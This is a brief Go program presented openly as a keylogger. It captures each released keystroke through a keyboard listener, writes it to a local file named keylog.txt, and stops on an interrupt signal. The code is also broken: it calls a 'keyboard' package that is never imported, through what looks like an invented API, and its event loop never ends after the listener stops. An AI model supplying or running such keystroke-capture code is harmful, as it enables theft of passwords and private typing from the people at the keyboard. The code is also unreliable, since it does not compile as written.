package main

// Importing necessary packages
import (
 "fmt"
 "os"
 "os/signal"
 "syscall"
)

func main() {
 // Initialize the keyboard listener
 kb, err := keyboard.NewKeyboard()
 if err != nil {
  fmt.Printf("Failed to initialize keyboard listener: %v\n", err)
  return
 }

 // Open a file to store the logged keystrokes
 file, err := os.Create("keylog.txt")
 if err != nil {
  fmt.Printf("Failed to create keylog file: %v\n", err)
  return
 }
 defer file.Close()

 // Start listening for keyboard events
 err = kb.Start()
 if err != nil {
  fmt.Printf("Failed to start keyboard listener: %v\n", err)
  return
 }

 // Handle Ctrl+C signal to stop the keylogger
 signalChan := make(chan os.Signal, 1)
 signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)
 go func() {
  <-signalChan
  fmt.Println("\nStopping keylogger...")
  kb.Stop()
 }()

 fmt.Println("Keylogger started. Press Ctrl+C to stop.")

 // Log keystrokes
 for {
  event := <-kb.Events
  if event.Err != nil {
   fmt.Printf("Failed to read keyboard event: %v\n", event.Err)
   continue
  }

  if event.Kind == keyboard.KeyRelease {
   // Write the key to the log file
   file.WriteString(fmt.Sprintf("%s\n", event.Key))
  }
 }
}